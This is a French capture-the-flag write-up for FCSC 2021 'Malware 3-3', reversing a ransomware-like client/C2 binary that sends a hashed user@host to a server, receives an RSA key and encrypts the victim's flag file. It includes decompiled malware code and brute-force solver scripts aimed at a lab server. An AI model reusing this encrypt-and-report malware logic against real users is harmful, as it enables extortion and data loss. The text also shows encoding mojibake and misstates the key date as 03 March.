# Malware 3-3

```text
Ce challenge est un challenge en 3 parties indÃ©pendantes, mais dont l'ordre logique est indiquÃ© par les numÃ©ros : forensics (1) -> pwn (2) -> reverse (3).

/!\ Le programme a de rÃ©elles capacitÃ©s malveillantes /!\

Ouf ! Vous avez rÃ©ussi Ã  rÃ©cupÃ©rer le malware, Ã  vous connecter sur le serveur de l'attaquant et Ã  rÃ©cupÃ©rer la clÃ© privÃ©e (fichier key.priv ci-joint) ayant servi Ã  chiffrer votre prÃ©cieux flag.

Le fichier key.priv portait initialement le nom : 0fdb0eea57198b3bb69e8267690ede5d5ba95ab791638a610372120b773d4acc_2021-03-15|21:34:41.priv.

Dechiffrez le fichier flag.txt pour valider cette Ã©preuve.

    SHA256(malware) = d63087cb4ad44b1bf07646e195e8bc2997ab0dea6119f0ef6c70ddcc51dc7f11.
    SHA256(flag.txt) = 14474b163650c1e940ae9612e29c4a8a5012f1ee1d31c6262f84e657680568b8.
    SHA256(key.priv) = 55a4f14531fbc38349687d1a8fb13faa55a52bb8cff5bb23576ca72c595af37f.
```

Tag: `reverse`

## Analyse

AprÃ¨s avoir fait la partie forensics, on sait quâ€™une personne mal intentionnÃ©e a exÃ©cutÃ© un malware sur la machine. Celui-ci a chiffrÃ© le fichier flag.txt sur le bureau de lâ€™utilisateur. Le challenge nous fournit directement le malware ainsi que le flag chiffrÃ© et une clÃ© privÃ©e protÃ©gÃ©e par un mot de passe.

PremiÃ¨re Ã©tape, j'ouvre le binaire dans `ghidra`.

En commenÃ§ant Ã  reverse le malware, je comprends qu'il a deux modes de fonctionnement. Le premier avec l'option `--client` qui indique au malware qu'il doit se connecter Ã  un serveur pointÃ© par l'option `-d` pour un nom de domaine et `-i` pour une adresse IP.

L'autre mode de fonctionnement est avec l'option `--serveur` qui indique au malware de se mettre en Ã©coute.

Voici le code de la fonction `main` que Ghidra me gÃ©nÃ¨re:

```c
undefined8 main(uint argc,undefined8 argv)
{
  [snip]
    // RÃ©cupÃ©ration des arguments
    iVar3 = getopt_long((ulong)argc,argv,"i:d:cs",&PTR_s_client_00407240,0);
    if (iVar3 == -1) {
      FUN_00402522((ulong)argc,argv,&DAT_00404063,argv);
      prctl(0xf,&DAT_00404063,0,0,0);
      // utilisation des deux options en mÃªme temps
      if ((clientOption) && (serverOption)) {
        puts("Vous ne pouvez utiliser --client et --serveur en mÃªme temps");
                    /* WARNING: Subroutine does not return */
        exit(1);
      }
      // Utilisateur des options -d ou -i avec --serveur
      if ((serverOption) && ((bVar1 || (bVar2)))) {
        puts("Vous ne pouvez utiliser --serveur et -d ou -i en mÃªme temps");
                    /* WARNING: Subroutine does not return */
        exit(1);
      }
      // Utilisation de -i et -d
      if ((bVar1) && (bVar2)) {
        puts("Vous ne pouvez utiliser -i et -d en mÃªme temps");
                    /* WARNING: Subroutine does not return */
        exit(1);
      }
      if (clientOption) {
        if (bVar1) {
          connectClient((char *)0x0,local_18);
        }
        else {
          // Pas de domaine ou d'@IP passÃ© en argument
          if (!bVar2) {
            printf("-i ip ou -d domain manquant");
                    /* WARNING: Subroutine does not return */
            exit(1);
          }
          connectClient(local_28,(char *)0x0);
        }
      }
      else {
        if (!serverOption) {
          puts("Vous devez avoir --client ou --serveur");
                    /* WARNING: Subroutine does not return */
          exit(1);
        }
        openServer();
      }
      return 0;
    }
    if (iVar3 != 0x73) break;
    serverOption = true;
  }
  [snip]
  }
  // Aucune option ou option non reconnue
LAB_00402671:
  puts("Option non reconnue. Utilisation : ./c2 [--client [-d domaine | -i ip] | --serveur]");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

*Les noms de fonction et variable ont Ã©tÃ© renommÃ© pour une meilleure comprÃ©hension.*

## Client

Lorsque le binaire est exÃ©cutÃ© avec l'option `--client` celui-ci se connecte au serveur c&c (Command and Control) pointÃ© par l'option `-d` ou l'adresse IP pointÃ© par `-i`. Puis dans un second temps concatÃ¨ne le nom d'utilisateur et le nom d'hÃ´te de la machine et hash cette valeur en sha256. Il fait ensuite un court calcul pour avoir une valeur pseudo random basÃ© sur la fonction `time`.

```c
void connectClient(char *hostName,char *ipAddress)
{
  [snip]
  // hashage du nom d'utilisateur + @ + nom d'hÃ´te
  userName = getUsernameTty();
  machineName = getHostName();
  cmdUsername = concat(userName,"@");
  cmdFullName = concat(cmdUsername,machineName);
  SHA256_Init(&local_518);
  len = strlen(cmdFullName);
  SHA256_Update(&local_518,cmdFullName,len);
  SHA256_Final(sha256SumCmdFullName,&local_518);
  0_OneCharSha256SumCmdFullName = (char *)calloc(0x41,1);
  index = 0;
  // Conversion en hexadecimal (0x20 = 32)
  while (index < 0x20) {
    sprintf(0_OneCharSha256SumCmdFullName + index * 2,"%02x",(ulong)sha256SumCmdFullName[index]);
    index = index + 1;
  }
  len = strlen(0_OneCharSha256SumCmdFullName);
  if (len != 0x40) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }

  // Calcul d'une valeur Pseudo Random
  actualTime = time((time_t *)0x0);
  srand((uint)actualTime);
  pseudoRandomValue = rand();
  pseudoRandomValueModulo = pseudoRandomValue % 1000;
  ModuloLogarithme = log10((double)pseudoRandomValueModulo);
  ModuloLogarithmeAddOne = (int)(ModuloLogarithme + 1.00000000);
  pseudoRandomInt = (char *)malloc((long)ModuloLogarithmeAddOne);
  sprintf(pseudoRandomInt,"%d",(ulong)pseudoRandomValueModulo);
  0_OneCharSha256Concat = concat(0_OneCharSha256SumCmdFullName,";");
  sha256WithPseudoRandomInt = concat(0_OneCharSha256Concat,pseudoRandomInt);
  len = strlen(sha256WithPseudoRandomInt);
  // Envoie la valeur calculÃ© sha256 + pseudo random value
  sVar1 = send(tcp,sha256WithPseudoRandomInt,len,0);
  local_74 = (int)sVar1;
  if (local_74 < 0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  // RÃ©ception de la clÃ© publique
  sVar1 = recv(tcp,tcpBuffer,0x3ff,0);
  local_74 = (int)sVar1;
  if (local_74 < 1) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  // Fin de la string
  tcpBuffer[local_74] = '\0';

  // Fonction de chiffrement du flag
  encryptHomeFlag(tcpBuffer);
  close(tcp);
  sleep(10000);
  return;
}
```

Une fois le sha256 et la valeur pseudo random rÃ©cupÃ©rÃ©, il les envoie au c&c qui lui renvoie une clÃ© publique. Cette clÃ© publique servira ensuite Ã  chiffrer le fichier `flag.txt` sur le bureau de l'utilisateur.

```c
  __n = strlen(param_1);
  local_20 = BIO_new_mem_buf(param_1,(int)__n);
  local_50 = RSA_new();
  PEM_read_bio_RSA_PUBKEY(local_20,&local_50,(undefined1 *)0x0,(void *)0x0);
  BIO_free(local_20);
  // RÃ©cupÃ©ration du nom de l'utilisateur
  userName = getUsernameTty();
  // RÃ©cupÃ©ration du chemin
  userHomePath = concat("/home/",userName);
  userFlagTxtPath = concat(userHomePath,"/Bureau/flag.txt");
  // Lis le contenu du fichier
  contentFile = (uchar *)readFile(userFlagTxtPath);
  if (contentFile == (uchar *)0x0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  iVar1 = RSA_size(local_50);
  local_40 = (uchar *)malloc((long)iVar1);
  rsa = local_50;
  __n = strlen((char *)contentFile);
  // Chiffre le contenu
  local_44 = RSA_public_encrypt((int)__n,contentFile,local_40,rsa,4);
  RSA_free(local_50);
  __n = strlen((char *)contentFile);
  memset(contentFile,0,__n);
  // Ecrit le nouveau contenu
  writeInFile(local_40,userFlagTxtPath,local_44);
  return;
```

Parfait, maintenant nous connaissons le fonctionnement de la partie cliente. Attaquons-nous Ã  la partie serveur.

## Serveur

La partie serveur Ã©coute constamment sur le port `4000` d'une nouvelle connexion. Puis crÃ©er un nouveau processus avec `fork`.

```c
  while( true ) {
    acceptedClient = accept(tcp,&local_48,&local_1c);
    if ((int)acceptedClient < 0) {
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    local_18 = fork();
    if (local_18 < 0) break;
    if (local_18 == 0) {
      close(tcp);
      newClient(acceptedClient);
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
```

Quand un client se connecte, il exÃ©cute une fonction pour rÃ©cupÃ©rer le hash ainsi que le nombre pseudo random.

```c
  // RÃ©cupÃ©ration du message
  sizeClientSocketMessage = recv(clientSocket,clientSocketMessageRecv,0x400,0);
  if ((long)sizeClientSocketMessage < 0) {
    uVar1 = 0;
  }
  else {
    // Conversion du message reÃ§u
    uVar1 = convertMessageClient(clientSocket,clientSocketMessageRecv,sizeClientSocketMessage);
  }
```

La fonction de conversion de message appelle ensuite une fonction qui permet de crÃ©er un mot de passe qui sera utilisÃ© pour la clÃ© RSA.

```c
  // RÃ©cupÃ©ration de l'index du ;
  addrPointVirgules = memrchr(messageClientSocket,0x3b,sizeMessageClientSocket);
  local_10 = (long)(int)addrPointVirgules;
  if (local_10 == 0) {
    uVar1 = 0;
  }
  else {
    local_14 = (int)addrPointVirgules - (int)messageClientSocket;
    // Copie du hash 256 dans la variable sha256value
    memcpy(sha256value,messageClientSocket,(long)local_14);
                    /* Compile la regex */
    local_18 = regcomp(&regexCompiled,"^[a-f0-9]{64}",1);
    // Execute la regex
    local_18 = regexec(&regexCompiled,sha256value,0,(regmatch_t *)0x0,0);
                    /* if successfull match (regex) */
    if (local_18 == 0) {
                    /* Replace ";" by a null byte */
      sha256value[local_14] = '\0';
                    /* Length of the strings after ";" */
      __size = strlen((char *)((long)messageClientSocket + (long)local_14 + 1));
      intMessageSocketClient = (char *)malloc(__size);
      strcpy(intMessageSocketClient,(char *)((long)local_14 + 1 + (long)messageClientSocket));
      __isoc99_sscanf(intMessageSocketClient,&DAT_0040420a,&lenIntMessageSocketClient);
      // Modulo 1000 effectuÃ© sur la valeur pseudo random
      if ((int)lenIntMessageSocketClient % 1000 == lenIntMessageSocketClient) {
        // Temps unix
        currentUnixTime = time((time_t *)0x0);
        // Conversion
        structUnixLocalTime = localtime(&currentUnixTime);
        // Conversion temps unix en AAAA-MM-DD|HH:MM:SS
        strftime(stringUnixLocalTime,0x1a,"%Y-%m-%d|%H:%M:%S",structUnixLocalTime);
        // CrÃ©ation du mot de passe pour la clÃ© RSA
        rsaPassword = (char *)createRsaPassword(sha256value,stringUnixLocalTime,
                                                (ulong)lenIntMessageSocketClient,stringUnixLocalTime
                                               );
        // CrÃ©ation de la paire de clÃ© RSA
        local_38 = (char *)functionToExploitIThink(rsaPassword,sha256value,stringUnixLocalTime);
```

Pour au final, crÃ©er une paire de clÃ©s RSA avec la commande `openssl`.

```c
  if (iVar1 != 0) {
    local_f8 = "openssl";
    local_f0 = "genrsa";
    local_e8 = "-aes256";
    local_e0 = &OUT;
    local_d8 = pathToPrivKey;
    local_d0 = "-passout";
    local_c8 = pass;
    local_c0 = &4096;
    local_b8 = 0;
    executeCommand(&local_f8);
    local_a8 = "openssl";
    local_a0 = &RSA;
    local_98 = &IN;
    local_90 = pathToPrivKey;
    local_88 = "-passin";
    local_80 = pass;
    local_78 = "-pubout";
    local_70 = &OUT;
    local_68 = pathToPubKey;
    local_60 = 0;
    executeCommand(&local_a8);
```

Les clÃ©s sont enregistrÃ©es dans le dossier `/keys` du serveur avec pour nom, la valeur sha256 envoyÃ© par le client et l'heure Ã  laquelle le message a Ã©tÃ© reÃ§u. La description prend donc tout son sens. Le fichier `key.priv` portÃ© le nom `0fdb0eea57198b3bb69e8267690ede5d5ba95ab791638a610372120b773d4acc_2021-03-15|21:34:41.priv` auparavant. Ce qui signifie que le client a envoyÃ© son message le 03 Mars 2021 Ã  21h34m41s. Aussi la concatenation de son nom d'utilisateur et du nom d'hÃ´te donne `0fdb0eea57198b3bb69e8267690ede5d5ba95ab791638a610372120b773d4acc`.

On peut vÃ©rifier facilement cette information car on connait le nom d'utilisateur `forensics` et le nom d'hÃ´te `fcsc2021`.

```python
[ aether@ysera  ~  % ] python3
Python 3.6.9 (default, Jan 26 2021, 15:33:00) 
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import hashlib
>>> hashlib.sha256(b"forensics@fcsc2021").hexdigest()
'0fdb0eea57198b3bb69e8267690ede5d5ba95ab791638a610372120b773d4acc'
```

## Password

AprÃ¨s avoir un peu jouÃ© avec le programme, je dÃ©cide de crÃ©er une commande openssl qui va me permettre de voir le contenu qui lui ai passÃ© en argument. Cela va entre autres me permettre de voir le mot de passe. Si celui-ci se rÃ©pÃ¨te, je n'aurais pas besoin de chercher plus. J'aurais uniquement besoin de dÃ©chiffrer le fichier `flag.txt` avec l'uniquement mot de passe.

```python
import sys

with open("/tmp/openssl.log", "a") as f:
    f.write("\n".join(sys.argv[1:]) + "\n")
```

Je remplace ma commande openssl par ce script et je m'aperÃ§ois que les mots de passe dans le fichier ont tous la mÃªme base. MÃªme si le hash et l'heure changent.

```text
)4|V>1SY} m,Nz%cl5&=4601a07db25df3d83d1ce31a735485a215d8c1fc0217e4ad4fd8381132458bf8e2021-04-30|18:34:3604.65959574
)4|V>1SY} m,Nz%cl5&=40fdb0eea57198b3bb69e8267690ede5d5ba95ab791638a610372120b773d4acc2021-04-30|18:36:4214.65562116
```

Tous les mots de passes commencent par `)4|V>1SY} m,Nz%cl5&=4` puis la valeur du hash envoyÃ© par le client, l'heure Ã  laquelle le message est reÃ§u et ensuite un nombre flotant.

## Exploitation

Je ne voulais pas passer beaucoup de temps Ã  essayer de comprendre les fonctions pour trouver le mot de passe. J'ai dÃ©cidÃ© de prendre une solution de contournement pour aller plus vite. Etant donnÃ© que je connnais l'heure du message et le hash. Il me suffit simplement de faire une boucle sur mon serveur pour garder constamment l'heure Ã  `2021-03-15|21:34:41` et du cÃ´tÃ© de mon client, Ã  envoyer le hash du nom du fichierÂ `0fdb0eea57198b3bb69e8267690ede5d5ba95ab791638a610372120b773d4acc` et les valeurs de 0 Ã  1000.

Pourquoi 0 Ã  1000 ?
Tout simplement parce que la partie cÃ´tÃ© serveur vÃ©rifie que l'int envoyÃ© modulo 1000 est toujours Ã©gale Ã  elle mÃªme.

```c
/* MODULO ICI */
if ((int)lenIntMessageSocketClient % 1000 == lenIntMessageSocketClient) {
// RÃ©cupÃ©ration du temps unix actuel
currentUnixTime = time((time_t *)0x0);
// 
structUnixLocalTime = localtime(&currentUnixTime);
// Conversion du temps Unix en string au format AAAA-MM-DD|HH:MM:SS
strftime(stringUnixLocalTime,0x1a,"%Y-%m-%d|%H:%M:%S",structUnixLocalTime);
// CrÃ©ation du mot de passe pour la clÃ© RSA
rsaPassword = (char *)createRsaPassword(sha256value,stringUnixLocalTime,
                                        (ulong)lenIntMessageSocketClient,stringUnixLocalTime
                                        );
local_38 = (char *)functionToExploitIThink(rsaPassword,sha256value,stringUnixLocalTime);
```

Je crÃ©e un script qui enverra toutes les valeurs cÃ´tÃ© client.

```python
import socket

for index in range(1000):
    tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp.settimeout(1)
    tcp.connect(("192.168.1.59", 4000))
    tcp.send(b"0fdb0eea57198b3bb69e8267690ede5d5ba95ab791638a610372120b773d4acc;%d" % (index))
    tcp.recv(1024)
```

CÃ´tÃ© serveur, je change mon script openssl pour sauvegarder uniquement le mot de passe dans un fichier.

```python
#!/usr/bin/python3

import sys

with open("/tmp/passwd.txt", "a") as f:
    f.write(sys.argv[5] + "\n")
```

Puis la commande pour garder constamment la mÃªme heure.

```bash
while true; do sudo date --set="2021-03-15 21:34:41"; done
```

AprÃ¨s quelques secondes d'exÃ©cution le script se termine. Mon fichier de mot de passe distant est rempli !

```text
)4|V>1SY} m,Nz%cl5&=40fdb0eea57198b3bb69e8267690ede5d5ba95ab791638a610372120b773d4acc2021-03-15|21:34:4104.65959574
)4|V>1SY} m,Nz%cl5&=40fdb0eea57198b3bb69e8267690ede5d5ba95ab791638a610372120b773d4acc2021-03-15|21:34:4114.65562116
)4|V>1SY} m,Nz%cl5&=40fdb0eea57198b3bb69e8267690ede5d5ba95ab791638a610372120b773d4acc2021-03-15|21:34:4124.66148808
)4|V>1SY} m,Nz%cl5&=40fdb0eea57198b3bb69e8267690ede5d5ba95ab791638a610372120b773d4acc2021-03-15|21:34:4134.66148808
[snip]
```

Il ne me reste plus qu'Ã  tester chacune de ces clÃ©s jusqu'Ã  trouver la bonne.

```python

import subprocess

with open("bruteforce.key") as f:
    data = f.read().splitlines()

argv = [
    "openssl",
    "rsa",
    "-in",
    "key.priv",
    "-passin",
    "pass:",
    "-pubout",
    "-out",
    "key.pub"
]

for password in data:

    argv[5] = f"pass:{password}"

    stderr = open("/tmp/stderropenssl", "wb")

    process = subprocess.Popen(argv, stderr=stderr, stdout=stderr)

    while process.poll() is None:
        continue

    if "writing RSA key" in open("/tmp/stderropenssl", "r").read():
        print(f"Password: {password}")
        exit(0)
```

output:

```bash
[ aether@ysera  ~/Documents/FCSC/2021/reverse/Malware  % ] python3 bruteforce.py 
Password: )4|V>1SY} m,Nz%cl5&=40fdb0eea57198b3bb69e8267690ede5d5ba95ab791638a610372120b773d4acc2021-03-15|21:34:415784.65833391
```

VoilÃ  le mot de passe !

## Padding\t\t\t\t\t\t\t\t\t

AprÃ¨s avoir mit le mot de passe dans un fichier, je dÃ©chiffre le fichier `flag.txt` avec openssl:

```bash
[ aether@ysera  ~/Documents/FCSC/2021/reverse/Malware  % ] openssl rsautl -decrypt -in flag.txt.enc -out flag.txt -inkey key.priv -passin file:master.key
RSA operation error
140165181530560:error:0407109F:rsa routines:RSA_padding_check_PKCS1_type_2:pkcs decoding error:../crypto/rsa/rsa_pk1.c:244:
140165181530560:error:04065072:rsa routines:rsa_ossl_private_decrypt:padding check failed:../crypto/rsa/rsa_ossl.c:485:
```

Ahaha, si proche du but.

Cependant le message `padding check failed` me met sur la voie. Une courte recherche sur internet sur les diffÃ©rents padding disponible avec d'openssl et le tour est jouÃ©.

*cf: <https://www.mkssoftware.com/docs/man1/openssl_rsautl.1.asp>*

## DÃ©chiffrement

```bash
[ aether@ysera  ~/Documents/FCSC/2021/reverse/Malware  % ] openssl rsautl -decrypt -in flag.txt.enc -out flag.txt -inkey key.priv -passin file:master.key -oaep
[ aether@ysera  ~/Documents/FCSC/2021/reverse/Malware  % ] cat flag.txt
ğ”½â„‚ğ•Šâ„‚{ğ•”ğ••ğŸŸğŸœğ•“ğŸ˜ğ••ğŸ›ğŸ›ğŸœğ•’ğŸ ğ•“ğ•–ğŸğŸğŸğŸğŸœğŸ˜ğŸšğ•”ğ•”ğŸœğŸ ğŸğ•–ğŸ ğ•’ğŸğŸšğŸšğŸšğ••ğ••ğŸ›ğŸšğŸ˜ğŸ ğŸœğ•—ğ•’ğŸ›ğŸğŸ ğŸğ•’ğ•–ğ•”ğŸ™ğ••ğŸœğŸ ğŸğ•—ğŸğŸ›ğ•–ğŸğŸ˜ğŸ ğ•–ğ••ğŸœ}
```

Je retranscris le flag en ascii Ã  la main et le challenge est validÃ© !

flag: `FCSC{cd74b0d334a8be5666402cc486e8a6222dd32084fa3585aec1d485f53e508ed4}`
